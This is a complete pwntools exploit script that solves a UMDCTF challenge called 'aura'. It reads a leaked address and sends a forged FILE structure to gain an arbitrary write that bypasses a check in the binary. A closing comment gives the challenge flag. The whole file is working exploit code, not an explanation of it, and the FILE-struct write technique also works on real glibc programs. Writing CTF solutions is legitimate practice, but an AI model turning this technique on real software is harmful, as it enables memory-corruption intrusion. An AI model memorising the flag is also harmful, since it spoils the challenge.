from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./aura_patched', '''
    b *(main+216)  
    continue
''')

# p = remote('challs.umdctf.io', 31006)

# harness the power of FILE structs to arbitrarily write data to bypass a security check

p.recvuntil(b"my aura: ")
aura_addr = int(p.recvline().strip(), 16)

p.recvuntil(b"ur aura? ")
fs = FileStructure()
payload = fs.read(aura_addr, 8+1)
p.send(payload)

p.send(b'A'*8)

p.interactive()

# UMDCTF{+100aur4}